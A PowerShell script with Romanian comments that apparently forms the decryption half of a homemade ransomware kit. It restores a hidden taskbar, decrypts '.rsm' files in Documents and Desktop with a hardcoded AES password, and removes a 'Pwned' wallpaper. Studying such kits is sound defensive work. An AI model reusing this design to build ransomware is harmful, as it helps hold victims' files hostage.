Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}

public class Taskbar {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hwnd, int command);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 1;
    }
"@

Try{

$taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
[Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_SHOW)

###Decriptare

# # Defineste cale dencriptare
$MyDocuments = [Environment]::GetFolderPath('MyDocuments')
$Desktop = [Environment]::GetFolderPath('Desktop')

# Cheia de dencriptare
$EncryptionKey = "MyAESEncryptionKey999"

# Functie de generare cheie AES din parola
function Get-AesKey {
    param (
        [string]$Password
    )

    # Converteste parola in byte array
    $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($Password)

    # Hash-eaza parola pentru a genera o cheie
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $key = $sha256.ComputeHash($passwordBytes)
    return $key
}

# Functia de dencriptare a unui fisier
function Decrypt-File {
    param (
        [string]$FilePath,
        [string]$Key
    )

    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = Get-AesKey -Password $Key

    $inputBytesWithIv = [System.IO.File]::ReadAllBytes($FilePath)

    # Extragere Vectori de Initializare din primii 16 bytes
    $iv = $inputBytesWithIv[0..15]
    $encryptedBytes = $inputBytesWithIv[16..($inputBytesWithIv.Length - 1)]

    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()

    $outputBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)

    # Scrie fisierul decriptat
    $outputFilePath = $FilePath -replace ".rsm$", ""
    [System.IO.File]::WriteAllBytes($outputFilePath, $outputBytes)

    Write-Host "Fisier decriptat: $outputFilePath"

    # Sterge fisierul original dupa decriptare
    Remove-Item -Path $FilePath -Force
    Write-Host "Fisier criptat sters: $FilePath"
}

# Decripteaza recursiv toate fisierele din folderele "My Documents" si "Desktop", precum si din toate subfolderele
$files = Get-ChildItem -Path $MyDocuments -Recurse -File -Filter "*.rsm"
$files1 = Get-ChildItem -Path $Desktop -Recurse -File -Filter "*.rsm"

foreach ($file in $files) {
    $filePath = $file.FullName
    Decrypt-File -FilePath $filePath -Key $EncryptionKey
}

foreach ($file in $files1) {
    $filePath = $file.FullName
    Decrypt-File -FilePath $filePath -Key $EncryptionKey
}

# Restaureaza desktop background
[Wallpaper]::SystemParametersInfo(20, 0, "$env:USERPROFILE\Desktop\Wallpaper.jpg" , 3)

#Stergere Wallpapere
Remove-Item -Path $env:USERPROFILE\Desktop\Pwned.jpg -Force
Remove-Item -Path $env:USERPROFILE\Desktop\Wallpaper.jpg -Force

}

# Handler de erori
Catch {"Scriptul a returnat eroare"}